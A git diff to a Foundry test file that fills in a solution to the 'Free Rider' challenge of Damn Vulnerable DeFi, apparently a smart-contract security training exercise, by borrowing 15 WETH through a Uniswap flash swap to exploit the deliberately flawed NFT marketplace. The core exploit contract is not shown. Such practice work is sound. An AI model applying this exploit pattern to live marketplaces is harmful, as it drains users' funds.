@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {SimpleFlashSwap} from "./SimpleFlashSwap.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +124,11 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        SimpleFlashSwap flashSwap = new SimpleFlashSwap(marketplace, nft, recoveryManager,player);
+        // Start flash swap to borrow WETH
+        uint256 amountToBorrow = 15 ether ;
+        flashSwap.startFlashSwap(address(uniswapPair), address(weth), amountToBorrow);
+        weth.withdraw(weth.balanceOf(address(player)));
     }
 
     /**
